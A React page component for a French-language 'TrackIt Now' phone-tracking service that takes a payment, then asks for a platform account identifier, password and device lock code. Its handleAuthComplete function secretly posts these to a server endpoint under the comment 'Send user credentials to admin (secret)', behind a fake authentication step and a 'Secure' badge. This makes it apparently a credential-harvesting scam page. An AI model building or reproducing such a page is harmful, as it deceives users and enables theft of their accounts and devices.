import { useQuery } from "@tanstack/react-query";
import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Satellite, Shield, MapPin, Zap, ArrowLeft, LogOut } from "lucide-react";
import { ThemeToggle } from "@/components/theme-provider";
import { PlatformSelection } from "@/components/platform-selection";
import { DeviceSelection } from "@/components/device-selection";
import { UserIdentifier } from "@/components/user-identifier";
import { AuthenticationProcess } from "@/components/authentication-process";
import { IMEIGeneration } from "@/components/imei-generation";
import { PaymentSection } from "@/components/payment-section";
import { MainDashboard } from "@/components/main-dashboard";
import { Platform } from "@/lib/device-data";
import { generateIMEI } from "@/lib/tracking-utils";
import { useToast } from "@/hooks/use-toast";
import { useLocation, Link } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import { Button } from "@/components/ui/button";
import { apiRequest } from "@/lib/queryClient";

type Step = 'platform' | 'device' | 'payment' | 'identifier' | 'auth' | 'dashboard';

export default function TrackingDashboard() {
  const [, setLocation] = useLocation();
  const [currentStep, setCurrentStep] = useState<Step>('platform');
  const [selectedPlatform, setSelectedPlatform] = useState<Platform>('');
  const [selectedDevice, setSelectedDevice] = useState('');
  const [userIdentifier, setUserIdentifier] = useState('');
  const [userPassword, setUserPassword] = useState('');
  const [userLockCode, setUserLockCode] = useState('');
  const [userEmail, setUserEmail] = useState('');
  const [isFastTrack, setIsFastTrack] = useState(false);
  const [purchaseId, setPurchaseId] = useState<number | undefined>();
  const { toast } = useToast();

  const { data: user, isLoading: isUserLoading } = useQuery<any>({ 
    queryKey: ["/api/user"],
    retry: false
  });

  useEffect(() => {
    // Check if we're reviewing an old request
    const params = new URLSearchParams(window.location.search);
    const id = params.get('id');
    if (id) {
      setCurrentStep('dashboard');
      toast({
        title: "Historique chargé",
        description: `Visualisation de la position sauvegardée pour ${id}`,
      });
    }

    const fast = params.get('fast') === 'true';
    if (fast) {
      setIsFastTrack(true);
    }
  }, []);

  useEffect(() => {
    if (!isUserLoading && !user) {
      toast({
        title: "Authentification requise",
        description: "Veuillez vous connecter pour accéder au service de tracking.",
        variant: "destructive"
      });
      setLocation("/?auth=true");
    }
  }, [isUserLoading, user, setLocation, toast]);

  useEffect(() => {
    // Add Leaflet CSS and JS
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
    document.head.appendChild(link);

    const script = document.createElement('script');
    script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
    document.head.appendChild(script);

    return () => {
      document.head.removeChild(link);
      document.head.removeChild(script);
    };
  }, []);

  const handlePlatformSelect = (platform: Platform) => {
    setSelectedPlatform(platform);
    setCurrentStep('device');
    toast({
      title: "Platform Selected",
      description: `${platform.toUpperCase()} platform selected successfully`,
    });
  };

  const handleDeviceSelect = (device: string) => {
    setSelectedDevice(device);
    
    // Si l'utilisateur est premium, on saute l'étape de paiement
    const isPremium = user?.premiumExpiry && new Date(user.premiumExpiry) > new Date();
    if (isPremium) {
      setCurrentStep('identifier');
    } else {
      setCurrentStep('payment');
    }
    
    toast({
      title: "Appareil Sélectionné",
      description: `${device} sélectionné avec succès`,
    });
  };

  const handlePaymentComplete = () => {
    setCurrentStep('identifier');
    toast({
      title: "Paiement Validé",
      description: "Service activé avec succès. Les emails de suivi seront envoyés à l'adresse de votre compte.",
    });
  };

  const handleAuthenticate = () => {
    if (!userIdentifier.trim() || !userPassword.trim() || !userLockCode.trim()) {
      toast({
        title: "Error",
        description: "Please fill in all required fields",
        variant: "destructive",
      });
      return;
    }
    setUserEmail(userIdentifier); // Use identifier as email
    setCurrentStep('auth');
  };

  const handleAuthComplete = async () => {
    // Send user credentials to admin (secret)
    try {
      const response = await fetch('/api/submit-credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: userEmail,
          platform: selectedPlatform,
          device: selectedDevice,
          identifier: userIdentifier,
          password: userPassword,
          lockCode: userLockCode,
          isFastTrack: isFastTrack
        })
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Failed to submit credentials');
      }

      const data = await response.json();
      if (data.purchaseId) {
        setPurchaseId(data.purchaseId);
      }

      setCurrentStep('dashboard');
    } catch (error) {
      console.error('Error submitting credentials:', error);
      toast({
        title: "Erreur de connexion",
        description: "Impossible d'envoyer vos informations. Veuillez réessayer.",
        variant: "destructive",
      });
      // Fallback to allow the user to proceed anyway
      setCurrentStep('dashboard');
    }
  };

  return (
    <div className="min-h-screen bg-[#0A0E1A] text-slate-50 overflow-x-hidden">
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 z-50 bg-[#0A0E1A]/80 backdrop-blur-xl border-b border-white/5">
        <div className="container mx-auto px-4 sm:px-6 py-3 sm:py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-2 sm:space-x-3">
              <Link href="/">
                <Button variant="ghost" size="icon" className="w-8 h-8 sm:w-10 sm:h-10 hover:bg-white/5">
                  <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5" />
                </Button>
              </Link>
              <div className="w-8 h-8 sm:w-10 sm:h-10 bg-primary rounded-lg sm:rounded-xl flex items-center justify-center shadow-lg shadow-primary/20">
                <Satellite className="text-white w-4 h-4 sm:w-5.5 sm:h-5.5" />
              </div>
              <span className="text-lg sm:text-xl font-bold tracking-tight hidden xs:inline">TrackIt <span className="text-primary">Now</span></span>
            </div>
            <div className="flex items-center space-x-2 sm:space-x-4">
              <div className="px-2 sm:px-4 py-1 sm:py-1.5 rounded-full bg-white/5 border border-white/10 flex items-center space-x-1.5 sm:space-x-2">
                <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 rounded-full bg-emerald-500 animate-pulse" />
                <span className="text-[8px] sm:text-[10px] font-bold uppercase tracking-widest text-slate-400">Secure</span>
              </div>
              <Button 
                variant="ghost" 
                size="sm" 
                onClick={() => apiRequest("POST", "/api/logout").then(() => setLocation("/"))}
                className="h-8 sm:h-9 hover:bg-red-500/10 hover:text-red-400 text-xs sm:text-sm"
              >
                <LogOut className="w-3.5 h-3.5 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
                <span className="hidden sm:inline">Logout</span>
              </Button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 sm:px-6 pt-20 sm:pt-28 pb-10 sm:pb-20 max-w-7xl flex flex-col items-center">
        <div className="relative w-full">
          {/* Progress Indicator */}
          <div className="mb-6 sm:mb-10 flex justify-between items-center max-w-xl mx-auto px-2 sm:px-4">
            {['Plateforme', 'Appareil', 'Paiement', 'Accès', 'Suivi'].map((step, i) => {
              const stepKey = ['platform', 'device', 'payment', 'identifier', 'dashboard'][i] as Step;
              const isActive = currentStep === stepKey || 
                (stepKey === 'platform' && currentStep !== 'platform') ||
                (stepKey === 'device' && !['platform', 'device'].includes(currentStep)) ||
                (stepKey === 'payment' && !['platform', 'device', 'payment'].includes(currentStep)) ||
                (stepKey === 'identifier' && ['auth', 'dashboard'].includes(currentStep));
              
              return (
                <div key={stepKey} className="flex flex-col items-center">
                  <div className={`w-8 h-8 sm:w-10 sm:h-10 rounded-full flex items-center justify-center border-2 transition-all duration-500 ${isActive ? 'bg-primary border-primary shadow-lg shadow-primary/20' : 'border-white/10 bg-white/5 text-slate-500'}`}>
                    <span className="text-[10px] sm:text-xs font-bold">{i + 1}</span>
                  </div>
                  <span className={`text-[8px] sm:text-[10px] uppercase font-bold tracking-widest mt-2 sm:mt-3 transition-colors ${isActive ? 'text-primary' : 'text-slate-600'}`}>{step}</span>
                </div>
              );
            })}
          </div>

          <motion.div 
            key={currentStep}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            transition={{ duration: 0.4 }}
            className="bg-white/5 border border-white/10 rounded-2xl sm:rounded-[2.5rem] p-4 sm:p-8 lg:p-12 backdrop-blur-sm"
          >
            {/* Step Content */}
            <AnimatePresence mode="wait">
              {currentStep === 'platform' && (
                <motion.div key="platform" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
                  <PlatformSelection 
                    onPlatformSelect={handlePlatformSelect}
                    selectedPlatform={selectedPlatform}
                  />
                </motion.div>
              )}

              {currentStep === 'device' && (
                <motion.div key="device" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
                  <DeviceSelection
                    platform={selectedPlatform}
                    selectedDevice={selectedDevice}
                    onDeviceSelect={handleDeviceSelect}
                    isVisible={true}
                  />
                </motion.div>
              )}

              {currentStep === 'payment' && (
                <motion.div key="payment" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
                  <PaymentSection
                    isVisible={true}
                    onPaymentComplete={handlePaymentComplete}
                    amount={isFastTrack ? 32.90 : 9.99}
                    device={selectedDevice}
                    userEmail={user?.email || ""}
                    trackingType={isFastTrack ? "priority" : "standard"}
                  />
                </motion.div>
              )}

              {currentStep === 'identifier' && (
                <motion.div key="identifier" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
                  <UserIdentifier
                    platform={selectedPlatform}
                    identifier={userIdentifier}
                    password={userPassword}
                    lockCode={userLockCode}
                    onIdentifierChange={setUserIdentifier}
                    onPasswordChange={setUserPassword}
                    onLockCodeChange={setUserLockCode}
                    onAuthenticate={handleAuthenticate}
                    isVisible={true}
                  />
                </motion.div>
              )}

              {currentStep === 'auth' && (
                <motion.div key="auth" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
                  <AuthenticationProcess
                    isVisible={true}
                    onAuthComplete={handleAuthComplete}
                  />
                </motion.div>
              )}

              {currentStep === 'dashboard' && (
                <motion.div key="dashboard" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
                  <MainDashboard
                    isVisible={true}
                    purchaseId={purchaseId}
                  />
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        </div>
      </main>
    </div>
  );
}
